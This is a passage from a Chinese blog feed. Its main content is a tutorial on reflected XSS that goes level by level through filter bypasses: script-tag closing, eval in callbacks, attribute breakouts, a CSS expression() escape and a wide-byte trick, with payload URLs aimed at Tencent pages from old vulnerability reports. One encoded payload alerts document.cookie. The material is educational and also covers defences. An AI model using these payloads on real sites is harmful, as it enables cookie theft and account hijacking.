    <![CDATA[<h1 id="符号的进阶">符号的进阶</h1>
<p>上一次是反斜杠发挥的妙用，它默默地转义了一个双引号，还有一些其他有意思的符号，比如换行符也能发挥妙用，这次是来自换行符的一发偷袭。</p>
<p>看这样一个地址：<br><a href="http://datalib.ga]]>
    </summary>
    
      <category term="TCP/IP" scheme="http://yoursite.com/tags/TCP-IP/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[(level 5)被忽略的反斜杠 -- XSS升级之路]]></title>
    <link href="http://yoursite.com/2016/05/14/-level-5-%E8%A2%AB%E5%BF%BD%E7%95%A5%E7%9A%84%E5%8F%8D%E6%96%9C%E6%9D%A0-XSS%E5%8D%87%E7%BA%A7%E4%B9%8B%E8%B7%AF/"/>
    <id>http://yoursite.com/2016/05/14/-level-5-被忽略的反斜杠-XSS升级之路/</id>
    <published>2016-05-14T14:40:25.000Z</published>
    <updated>2016-05-14T14:40:51.000Z</updated>
    <content type="html"><![CDATA[<h1 id="XSSer_升级之路">XSSer 升级之路</h1>
<p>之前积累了XSS 有一段时间，因为目前开始了一件有趣的工程，需要整合非常多的知识，其中Web 安全这一块出现最多的，应该就是XSS，SQL注入了，再加上乌云泡着看别人的文章，看各家大网站的漏洞，决定把这一块知识聚拢一下，写成一篇文章。想了想，从简单到难，那就是一条打怪升级之路，所以就从最简单的反射型漏洞开始，一点一点提高，直到把大部分XSS 的形式找出来。</p>
<h1 id="level_1_无过滤规则的XSS">level 1 无过滤规则的XSS</h1>
<p>最简单的跨站，也就是我们说的反射型跨站，也叫作非持久型，参数型跨站脚本。这种类型的脚本出现的面非常的广，互联网上这样的漏洞非常多，一般出没在各路小站点，大站点很少出现。乌云的漏洞列表里，海量的XSS 漏洞都来自互联网上访问量不高的小站，被辛苦挖洞的XSSer 们发掘出来的。</p>
<p>站在新手村我们的，需要一个最简单的野怪刷一下，这个野怪上下无任何装备，没有一点防御。也就是说，这个XSS 漏洞对于用户的输入，不做任何过滤行为。</p>
<p>一般来说，XSS 存在的地方，一定是需要有输入和输出概念的，一般的过滤规则，也是出现在输入阶段或者是输出阶段，如果两个都没有过滤，那么很轻松的就造成了漏洞。通常来说，这种洞非常好刷，比较自动化的方式是，建立一个爬虫系统，预设一些URL，爬虫爬取网页，在网页源码中寻找用户可以输入的地方，然后在可以输入的地方，将构造好的XSS 代码以输入形式，构造成请求，然后观察响应，是否对我们的输入做了过滤策略。如果是原本的返回，那么我们就说可能存在有xss漏洞。</p>
<p>同时，有另一种更为简单的漏洞，是直接在URL 中，如果有直接赋值参数的行为，也相当于一个可输入的位置，我们直接在URL 中将XSS 代码构造在URL 中，观察返回是否做了过滤处理，如果没有，那么就是一个最简单的野怪诞生。</p>
<p>在乌云中，有不少这样的漏洞，小站很多，大站很少，因为大站一般都有完备的过滤规则，很难在这些小问题上有任何闪失，再加上如今浏览器基本上都有安全策略对此类型进行防御，所以这种威力相对较小。</p>
<p>之前在HTTP 的文章里，有详细讲过 URL的格式，其基本格式如此：</p>
<p><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-03-14622667602815.jpg" alt=""></p>
<p>每个结构对应的含义如下：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-04-27-14609000091165.jpg" alt=""></p>
<p>通常的注入发生在query 这一块，而一般一个安全的行为，就是对query 中的字符进行过滤，以防止xss。以百度的URL 为例，一个通常的URL 查询之后的造型是下面这样的：</p>
<p><a href="http://www.baidu.com/s?wd=%E6%A0%87%E7%82%B9%E7%AC%A6&amp;rsv_spt=1&amp;issp=1&amp;rsv_bp=0&amp;ie=utf-8&amp;tn=baiduhome_pg&amp;inputT=2969" target="_blank" rel="external">http://www.baidu.com/s?wd=%E6%A0%87%E7%82%B9%E7%AC%A6&amp;rsv_spt=1&amp;issp=1&amp;rsv_bp=0&amp;ie=utf-8&amp;tn=baiduhome_pg&amp;inputT=2969</a></p>
<p>问号之后有一大堆参数，&amp;用来分割参数，他们对应的是什么意思不是本文关注的重点，可以参见这一篇文章<a href="http://www.biaodianfu.com/baidu-url-secret.html" target="_blank" rel="external">百度搜索URL 参数解析</a>。</p>
<p>其中wd 就是我们所说的搜索关键词，也就是我们的输入，如果我们将此字符改成</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>)&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>

<p>在输出时我们看到，URL 变成了如下，可疑的部分被转义了。</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https:<span class="comment">//www.baidu.com/s?wd=%22%3Cscript%3Ealert(%27xss%27)%3C%2Fscript%3E&rsv_spt=1&rsv_iqid=0xb3f5d3380002c15f&issp=1&f=3&rsv_bp=1&rsv_idx=2&ie=utf-8&tn=baiduhome_pg&rsv_enter=1&oq=%26lt%3Bscript%26gt%3Balert(%26%2339%3Bxss%26%2339%3B)%26lt%3B%2Fscript%26gt%3B&rsv_t=455e8xS9GVGwfM%2BTxjkNH6uUohEOPZHQFWlqocmOh9s1caJr5IHzVrPJJKJ1OwdTglc3&inputT=5478&rsv_sug3=27&rsv_sug1=21&rsv_sug7=100&rsv_pq=cce2beda0002a800&rsv_sug2=0&rsv_sug4=6278</span></div></pre></td></tr></table></figure>

<p>在这里举一个大站腾讯的简单的xss，是乌云上某马甲提交的，作为一个最简单的XSS 挖给大家学习。网站的网址是这样的：<br><strong><a href="http://app.data.qq.com/?umod=commentsoutlet&amp;act=count&amp;siteid=3&amp;libid=9&amp;dataid=1480&amp;score=1&amp;func=haoping&amp;_=1353475261886" target="_blank" rel="external">http://app.data.qq.com/?umod=commentsoutlet&amp;act=count&amp;siteid=3&amp;libid=9&amp;dataid=1480&amp;score=1&amp;func=haoping&amp;_=1353475261886</a></strong></p>
<p>如果我们在这个URL 里尝试修改参数，将score 参数改成</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=<span class="number">1</span>&gt;</div></pre></td></tr></table></figure>

<p>而输出的源码并没有发生变化：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-03-14622673299696.jpg" alt=""></p>
<p>在网易中看到的结果就变成了这样：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-03-14622673544485.jpg" alt=""></p>
<p>这很显然，就是一个xss漏洞了，将经典的xss 代码插入进去即可：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">score=<span class="xml"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">1</span> <span class="attribute">onerror</span>=<span class="value">alert(1);</span>&gt;</span></span></div></pre></td></tr></table></figure>

<p>效果如下：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-03-14622674130351.jpg" alt=""></p>
<p>这就是一个最无防御的XSS 存在，很明显的，它简单，暴力，当然也是极容易防御的，所以在一个较高级的攻防对抗，或者是大站漏洞中，基本上不会出现这样的漏洞（然而腾讯还是有这样的问题~~）。</p>
<h1 id="level_2_包装进script">level 2 包装进script</h1>
<p>上一等级里，我们的xss 构造格式是在img 中,然后直接通过URL 参数提交，通常反射型的XSS 比较广泛，但是伤害一般来说没有太高，而且比较容易防范。除了img 元素，还有诸如input, iframe，a href, 主要利用的是href 或者 src 可以使用javascript, 或者是使用onerror，表示当前图片无法显示时候可以调用的脚本。更多的内容，接下来详析。</p>
<p>接下来，我们针对的还是反射型的XSS，仍然是在参数中，作为目标文件中的参数，通过URL 传递给它，但是没有对该参数进行详细的过滤，造成了有机可趁，继续放出腾讯家以前的一个例子，也是乌云上的，网址如下：</p>
<p><a href="http://activity.soso.com/common/setParentsInfo.php?callback=aaaaaaaaa" target="_blank" rel="external">http://activity.soso.com/common/setParentsInfo.php?callback=aaaaaaaaa</a></p>
<p>此处的callback 参数，如果没有过滤的话，得到的网页源码里，我们就会看出来，如下：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-03-14622798034256.jpg" alt=""></p>
<p>拿出这一块的上下文代码，大约构造是这样的：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">'text/javascript'</span>&gt;<span class="built_in">document</span>.domain=<span class="string">'soso.com'</span>;_ret={<span class="string">"_res"</span>:<span class="number">2</span>};<span class="keyword">try</span>{parent.aaaaaa(_ret);}<span class="keyword">catch</span>(err){aaaaaa(_ret);}&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>

<p>aaaaaa如果我们替换成</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>)&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>

<p>当然，我们注意到，上边的script 还没有闭合，为了让代码提前跳出前一个script ，我们应该在前边吧sciprt 闭合，这样：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(/</span>xss/)&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>

<p>这样，很明显，就会继续发起了XSS 弹窗。但是，如果我们不允许输入破折号呢，上边所说的就没有办法了，但是，这并不代表毫无办法，还有一些具有威胁的函数，比如eval, String.fromCharCode, execute，这些都会造成XSS，也要过滤。如下，我们使用eval() 来构造攻击：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="comment">//activity.soso.com/common/setParentsInfo.php?callback=eval('alert(1)');void</span></div></pre></td></tr></table></figure>

<p>callback=eval(‘alert(1)’);void 仍然令我们的源代码语法正确，能够正确执行。<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-03-14622803866844.jpg" alt=""></p>
<p>但是像这样构造出来的情况，其实非常的少见，因为正常传第一个参数进去，开发者都会将 “ 过滤掉，这样构造就失败了。 </p>
<p>我们知道，XSSer 和 防御者之间的斗争从来就是道高一尺，魔高一丈的过程，防御者绞尽脑汁去过滤所有可能出现的情况，去处理所有可能的奇葩诡异编码情况，而XSSer 又会绞尽脑汁的去挖掘茫茫网络中漏洞，努力用各种奇技淫巧构造出五花八门的形态，看起来诡异无比，然而偏偏又能让javascript 语法正确，正常运行。</p>
<p>然而xss 却又一直是热门，但并不是很受重视的攻击手法，原因大概是这样的：</p>
<ol>
<li>挖洞太麻烦，很耗时间，看上边两个漏洞，其中一个甚至是在某个获取QQ 应用宝上某个app 数据的URL 里发现的，而这种页面甚至很难被发现，所以他的伤害比较低，找到它却又要花费大量时间，而且还有很多构造方法不能成功，需要尝试各种模式。</li>
<li>这种伤害不是很大的反射型攻击，尚且还有机会通过爬虫自动化的挖掘到漏洞存在的可能，有很多复杂的存储型和DOM 型漏洞，更难通过爬虫挖到。</li>
<li>需要有良好的HTML，JS 功底，但是呢，如果功底好的话，直接就跑去做前端了，前端业务现在那么缺高级工程师。更多的，还需要有PHP，JSP 功底。</li>
<li>而Website 设置http-only,crossdomain.xml 时候，很多模式化的xss就失去力量了。</li>
<li>然而为什么热门呢，因为HTTP 世界的混乱，之前在写Web之困读书笔记的时候，作者也是强力吐槽了这个混乱的HTTP 世界，所以造成了XSS 几乎无处不在，而如果一个利用好的XSS，或者CSRF漏洞，会在某些情况下，造成难以弥补的伤害。</li>
<li>本质上将，SQL注入和XSS 都是由于代码上相似的漏洞造成的，而SQL 注入的危害要比XSS 看起来危险很多，很多人在挖SQL 注入漏洞的时候，顺手就挖几个XSS，也是很正常的。</li>
<li>XSS 虽然看起来比较温柔，但是配上社工手段，可造成的影响仍然是不可小觑的，所以XSS 会火下去。</li>
</ol>
<h1 id="level_3_HTML_中的野怪">level 3 HTML 中的野怪</h1>
<p>当然XSS 的漏洞不仅仅只出现在script 代码块中，还可以包含在丰富的HTML 的标签属性中。比如img,input 等一系列标签，基本格式是 &lt; HTML标签 onXXXX=”在这里” &gt; 或者是放在伪URL 里，比如&lt; a href = “javascript:在这里”&gt; xxxx 。</p>
<p>一般这样地方的参数，很少是直接通过输入就直接放进去的，不过有时候常常是接受了用户的输入，最后输出的时候，会出现在这些位置，但如果对用户的输入没有做详尽的处理和过滤的话，就会出现明显的XSS 漏洞。来个栗子：</p>
<p>比如某网站是这样的：</p>
<p><a href="http://example.com/search.php?word=helloworld" target="_blank" rel="external">http://example.com/search.php?word=helloworld</a></p>
<p>对应在HTML 代码中，他出现在了这样的区域里：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">value</span>=<span class="value">"helloworld"</span> /&gt;</span></div></pre></td></tr></table></figure>

<p>开发者没有对helloworld进行过滤的话，我们直接构造</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">word=helloworld<span class="string">" onclick="</span>alert(<span class="regexp">/xss/</span>)</div></pre></td></tr></table></figure>

<p>然后在对引号括号等，使用URL 编码，直接变成如下结构：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">helloworld%22+onclick%3d%22alert(%2fxss%2f)</div></pre></td></tr></table></figure>

<p>也就完成了xss过程，不过这种漏洞现在已经非常稀少，因为它太容易过滤了，只需要将双引号过滤即可，一般做法就是将双引号过滤成HTML 实体编码，也就是&#quot; 对于HTML 解析器，它能够识别在文本节点和参数值里边的实体编码，并且在内存中创建文档树的表现形式时，透明的对这些编码进行解码。所以，在创建DOM 树结构的时候，&amp;quot(有个分号，但是markdown会直接转了); 还没有被解码成引号，而且创建文档树的内容的时，才会考虑解码，而这时，其XSS 功效已经不能发挥作用了。</p>
<p>于是，对于有过滤规则的情况下，该标签将变成：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">value</span>=<span class="value">"helloworld&quot; onclick=&quot;alert(1)"</span> /&gt;</span></div></pre></td></tr></table></figure>

<p>但是，仅仅是这样的过滤，显然是不够用的，还有其他的注入点可以进，继续在乌云上来看腾讯的例子，考虑这样一个网址：<br><a href="http://follow.v.t.qq.com/index.php?c=follow&amp;a=index&amp;appkey=801004516&amp;bg=FFFFFF&amp;hsize=80&amp;name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qingfengxu6685,zhouzhichen001,yuguoming-ruc,luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipengtx" target="_blank" rel="external">http://follow.v.t.qq.com/index.php?c=follow&amp;a=index&amp;appkey=801004516&amp;bg=FFFFFF&amp;hsize=80&amp;name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qingfengxu6685,zhouzhichen001,yuguoming-ruc,luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipengtx</a></p>
<p>我们查看输出的HTML 源码，发现bg 那里对应的是background-color,我们尝试那里用不同的字符尝试，观察其过滤情况。在这里，我让bg = “\&lt;&gt;() 就是希望观察一下它的过滤情况，基本上所有的字符都被过滤了，但是只有\ 没有被过滤<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-06-14625007746187.jpg" alt=""></p>
<p>如何只用 \ 构造利用语句呢，我们可以想到CSS 中的字符编码，CSS 提供了一套转义处理策略，一个反斜杠后边跟1~6位十六进制数字。然后利用CSS 的expression 来调用JavaScript 代码。也就是试图构造出</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">expression(eval(alert(/xss/))</div></pre></td></tr></table></figure>

<p>这样的代码，完整来说，就是这样的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">body</span> <span class="attribute">style</span>=<span class="value">"... background-color:;width:expression(eval(alert(/xss/)))"</span>&gt;</span></div></pre></td></tr></table></figure>

<p>用分号来结束backgroud-color,然后 w: 后边跟上expression,如果expression 要被过滤，那就加上转义，把expression 随意变下形就可以，于是，在下边这样的代码构造下，漏洞又被利用了。</p>
<p><a href="http://follow.v.t.qq.com/index.php?c=follow&amp;a=index&amp;appkey=801004516&amp;bg=;w:expr\65ssion\28%20eval\28\27\69\66\28\21\77\69\6e\64\6f\77\2e\78\29\7b\61\6c\65\72\74\28\64\6f\63\75\6d\65\6e\74\2e\63\6f\6f\6b\69\65\29\3b\77\69\6e\64\6f\77\2e\78\3d\31\7d\27\29\29&amp;hsize=80&amp;name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qingfengxu6685,zhouzhichen001,yuguoming-ruc,luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipengtx" target="_blank" rel="external">http://follow.v.t.qq.com/index.php?c=follow&amp;a=index&amp;appkey=801004516&amp;bg=;w:expr\65ssion\28%20eval\28\27\69\66\28\21\77\69\6e\64\6f\77\2e\78\29\7b\61\6c\65\72\74\28\64\6f\63\75\6d\65\6e\74\2e\63\6f\6f\6b\69\65\29\3b\77\69\6e\64\6f\77\2e\78\3d\31\7d\27\29\29&amp;hsize=80&amp;name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qingfengxu6685,zhouzhichen001,yuguoming-ruc,luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipengtx</a></p>
<p>不过很遗憾的，expression 当年是微软搞出来的技术，但是一直没被其他浏览器接受，同时，甚至微软自己如今也抛弃了这种特性，它出现在IE6，IE7，和IE8的一些早期版本，因为微软官方也认为该属性不具有通用性，而且它处理的事务，如今已经能够在CSS 中正常的完成，如min-width,max-width， 这些都已经在IE8之后得到很好的支持，所以expression 也只能在这两个古老版本上起效。</p>
<p>那么，继续考虑一些别的情况，考虑下面这个网站：<br><a href="http://stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaaaaa" target="_blank" rel="external">http://stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaaaaa</a></p>
<p>其输出的HTML 代码中，我们可以找到它：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-06-14625022573118.jpg" alt=""></p>
<p>对于放在javascript: 中的伪URL，其效果和放在script 代码块中没有区别。在这里 aaaaaa我们可以考虑对其做点什么，很自然的，我们想到用单引号闭合，然后后边加上alert(/xss/) 这样的构造，看起来比较绕，其构造步骤是这样的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">location.href=<span class="string">'...&searchvalue=aaaaaa'</span></div><div class="line">location.href=<span class="string">'...&searchvalue=aaaa'</span>+alert(<span class="number">1</span>)+<span class="string">''</span></div><div class="line">location.href=<span class="string">'...&searchvalue=aaaa&#x27;+alert(1)+&#x27;'</span></div></pre></td></tr></table></figure>

<p>如果单引号，被过滤，就要改成HTML 编码，这样，就能在源代码中javascript 伪URL那里添加了alert(1) 这样的XSS。这步骤改造完毕之后，我们将可能被过滤的&amp;-&gt; %26,#-&gt;%23 转换成URL 编码，构造成这样的URL：<br><a href="http://stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaa%26%23x27;%2balert(1)%2b%26%23x27" target="_blank" rel="external">http://stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaa%26%23x27;%2balert(1)%2b%26%23x27</a>;</p>
<p>至此，又完成了一次XSS 注入，但到此处，是否有一个疑问呢，还是关于编码解析的问题。在上一个栗子中，我们说，将双引号，改成&amp;quot ; 这样的形式，就不会出现异常的解析了，但是这里，我们主动的将单引号改成了&amp;#27 ; 这样的形式，反而成功的完成了XSS 呢。</p>
<p>其实，这是一个解析顺序的原因，正常的解析顺序是这样的，先对URL解码，那些用URL 编码的字符都变成解码后的参数传出去，然后是HTML 解析，HTML 解析，此时 ，是先构建DOM文档结构，然后才会对每一个文本节点，属性值内容进行解析，这时候，HTML 实体编码的部分，才会还原回来，这个时候已经不会对DOM 结构造成影响了。然后是JS 解析，此时才会执行JS 代码的内容。而此时，HTML 已经完成了解码。</p>
<p>对应上边的栗子，在JS 解析之前，HTML 已经对那些编码完成了解码，对于JS 来说，一切都写的清清楚楚的了。</p>
<p>回到那个栗子，我们利用的代码，原样是这样的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">li</span>&gt;</span><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">id</span>=<span class="value">"pagenum"</span>  <span class="attribute">class</span>=<span class="value">"inputstyle0814"</span>  <span class="attribute">onkeydown</span>=<span class="value">"if ((event.keyCode==13) && (this.value!='')) location.href='http://stock.finance.qq.com/report/search.php?offset='+this.value+'&searchtype_yjbg=yjjg&searchvalue_yjbg=aaaaaaaaaa'"</span>/&gt;</span><span class="tag">&lt;/<span class="title">li</span>&gt;</span></div></pre></td></tr></table></figure>

<p>当我们构造完成利用代码之后，对于页面上来说，就是要点击按钮，也就是onkeydown。 不仅要将URL 传出去，还需要用户点击按钮，这样造成的威胁小很多，不如img 标签里的onerror ，onload那样可以自动触发。</p>
<p>最后我们再考虑一下如何防守吧，上上栗子的问题，在于漏掉了斜杠的过滤，那么\ 该过滤还是要过滤的。对于上边这个栗子，可以考虑二次过滤，也就是将&amp;都过滤为 &amp;amp ;，这样不仅过滤了无编码的单引号等格式，又可以过滤掉利用实体编码想要逃过的实体编码格式。而如果只是用正则去片段&amp;#xNN..等形式，实际上是不一定搞定所有的HTML 编码形式的。</p>
<h1 id="level_4_离奇的宽字节">level 4 离奇的宽字节</h1>
<p>搞过SQL 注入的，应该是比较了解宽字节注入的，由于某些SQL 注入的核心是提前出线单引号来闭合前边的输入，然后在后边可以插入别的语句，联合查询等等。所以比较一般的过滤方式是将单引号转义，加一个斜杠。但此时忽略了编码的神奇。如果开发者在设置编码支持的时候，如果选择了GBK，gb18030,utf-8 等方式，实际上是支持十六位编码的。</p>
<p>最常见的方式，也就是在url里，在引号%27 或者是 %22 之前，加入%df, 由于0xdf 对应的大于128，所以，解析器会认为他和后边的组成了16位的编码，就会吃掉后边的字符，而后边跟着的字符，又恰恰是我们给引号添加的斜杠，%5c,于是%df 就会吃掉%5c 合并成一个字，引号重新暴露。</p>
<p>这种方法在XSS 不常见，但是如果某些XSS 在写过滤规则的时候，如果处理不当，还是有可能出现宽字节注入的情况，考虑如下url:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&t=%22;alert(1);//aaaaaa</div></pre></td></tr></table></figure>

<p>此处双引号被过滤了，变成了&amp;quot ;，如下：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-10-14628903722866.jpg" alt=""></p>
<p>如果我们尝试一下采用宽字节注入，考虑构造成如图所示：<br>zh_CN&amp;t=%c0%22;alert(1);</p>
<p>令人惊奇的是，这次注入成功了，观察代码如图：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-10-14628904952071.jpg" alt=""></p>
<p>当然，此处所遇到的问题，应该并不是前边提到的传统的形式，%c0 吃掉%5c ,因为很明显，此处没有使用斜杠转义，而是转成了&amp;quot ; 只能把原因归咎于正则表达式处理的问题。</p>
<p>我们看到，即使当以注意到了问题所在的时候，仍然可能犯错误，而且是以意想不到的方式犯错，黑客渗透的方式，可能会以所有意想不到的形式进行。</p>
<p>我们将防御性代码比做成安全的城墙，那么正则过滤引擎，应该是这座安全长城的第一站，而在《Web 之困》 一书中，作者也说过，要想试图过滤掉所有的危险的编码，这几乎是不可能完成的任务。但作为开发者，比黑客再多想一些，这是应该的。</p>
<p>在XSS 界，拥有各种各样的形式去变形构造，在owasp 里，这篇<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="external">XSS Filter Evasion Cheat Sheet</a> 详细介绍了各种变形，以期能穷尽目前已知的各种变形手段，下次，我会对其中的变性手段，进行总结。但是，你想要过滤这所有的变形手段，几乎是不可能的，即使你过滤了他们，而引擎本身出现的错误，又会创造新的漏洞，上述例子就是这样的。</p>
<h1 id="被忽略的反斜线">被忽略的反斜线</h1>
<p>通常，过滤XSS 就是要考虑过滤各种特殊的控制字符，比如尖括号，引号等，而如果过滤一旦漏过了某些符号，那就有可能通过各种转义，构造出一个绕过的XSS，下面就是一个例子。</p>
<p>看这样一个网站：<br><a href="http://mail.qq.com/cgi-bin/login?vt=passport&amp;ss=aaa&amp;from=bbb&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%25252Fcgi-bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526clickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1" target="_blank" rel="external">http://mail.qq.com/cgi-bin/login?vt=passport&amp;ss=aaa&amp;from=bbb&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%25252Fcgi-bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526clickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1</a></p>
<p>杂乱无章，我们对照网页的源码，逐个尝试看能够注入，首先是先定位这些变量对应的位置，主要关注的还是前三个，vt=pass, ss=aaa, form=bbb, 构造完成之后我们在源码中寻找他们的位置如图：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-14-14632350242002.jpg" alt=""></p>
<p>定位到位置之后，我们把这一堆能使用的符号都拉进去尝试，包括引号，破折号，反斜杠等，这里如果能直接利用，最好是有双引号，它可以直接闭合前边的语法，从而构造新的语法，但是，很遗憾双引号这种头号仇恨还是第一时间被过滤了，但是漏过了反斜杠。<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-14-14632351345985.jpg" alt=""></p>
<p>我们详细分析一下这一部分，考虑一下，看怎么注入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">getTop().location.href=<span class="string">"/cgi-bin/loginpage?autologin=n&errtype=1&verify=&clientuin="</span>+<span class="string">"&t="</span>+<span class="string">"&alias="</span>+<span class="string">"&regalias="</span>+<span class="string">"&delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%252Fcgi-bin%252Fsetting10%253Faction%253Dlist%2526t%253Dsetting10%2526ss%253Dindex%2526Mtype%253D1%2526clickpos%253D20%2526loc%253Ddelegate%252Cwebmap%252C%252C1"</span>+<span class="string">"&title="</span>+<span class="string">"&url=%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26ss%3Daaa%2522%26from%3Dbbb%5C%26delegate_url%3D%252Fcgi-bin%252Fframe_html%253Furl%253D%2525252Fcgi-bin%2525252Fsetting10%2525253Faction%2525253Dlist%25252526t%2525253Dsetting10%25252526ss%2525253Dindex%25252526Mtype%2525253D1%25252526clickpos%2525253D20%25252526loc%2525253Ddelegate%2525252Cwebmap%2525252C%2525252C1"</span>+<span class="string">"&org_fun="</span>+<span class="string">"&aliastype="</span>+<span class="string">"&ss=aaa"</span>+<span class="string">"&from=bbb"</span>+<span class="string">"&param="</span>+<span class="string">"&sp=6fa57ce5b3047ebMTM1NTQwOTA2Mg"</span>+<span class="string">"&r=3ec785174fff5206ed6f0cf4a8c5e3c5"</span>+<span class="string">"&ppp="</span>+<span class="string">"&secpp="</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p>核心部分，就是下边那小部分：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">getTop().location.href=<span class="string">"......"</span>+<span class="string">"&ss=aaa"</span>+<span class="string">"&from=bbb"</span>+<span class="string">"&param="</span>+<span class="string">"....."</span>;</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p>如果我们使用了反斜杠，那么双引号就被转义了，语法就变化了：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">getTop().location.href=<span class="string">"......"</span>+ <span class="string">"&ss=aaa\"+"</span> &from=bbb <span class="string">"+"</span> &param= <span class="string">"+"</span> .....<span class="string">";</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

